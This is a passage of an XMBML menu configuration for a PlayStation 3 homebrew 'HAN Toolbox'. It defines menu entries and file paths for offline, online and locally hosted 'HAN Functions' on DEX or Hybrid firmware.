				attr="han_advanced_menu"
				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/XMLS/han_toolbox_advanced_tools.xml#han_advanced_menu_dex_main"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_toolbox_setup" 
				attr="han_toolbox_setup"
				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/XMLS/han_toolbox_settings.xml#han_toolbox_setup_main"
				/>
		</Items>
	</View>
		
	<View id="han_functions_items_dex">
		<Attributes>
			<Table key="han_functions_offline_dex">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han.png</String></Pair>
				<Pair key="title"><String>HAN Functions (Offline)</String></Pair>
				<Pair key="info"><String>Autorun HAN functions for DEX Firmware/Hybrid (Offline)</String></Pair>
			</Table>
			<Table key="han_functions_online_dex">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han.png</String></Pair>
				<Pair key="title"><String>HAN Functions (Online)</String></Pair>
				<Pair key="info"><String>Autorun HAN Functions for DEX Firmware/Hybrid (Online)</String></Pair>
			</Table>
			<Table key="han_functions_local_dex">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han.png</String></Pair>
				<Pair key="title"><String>HAN Functions (Locally Hosted)</String></Pair>
				<Pair key="info"><String>Autorun HAN functions (Locally hosted via PKG Linker)</String></Pair>
			</Table>
		</Attributes>
		<Items>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_functions_offline_dex"
				attr="han_functions_offline_dex"
				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/XMLS/han_toolbox_han_functions_offline.xml#han_functions_dex_main_offline"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_functions_online_dex"
				attr="han_functions_online_dex"
				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/XMLS/han_toolbox_han_functions_online.xml#han_functions_dex_main_online"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_functions_local_dex"
				attr="han_functions_local_dex"
				src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/local_ps3xploit.xml#han_functions_local_items"
				/>
		</Items>
	</View>

</XMBML>
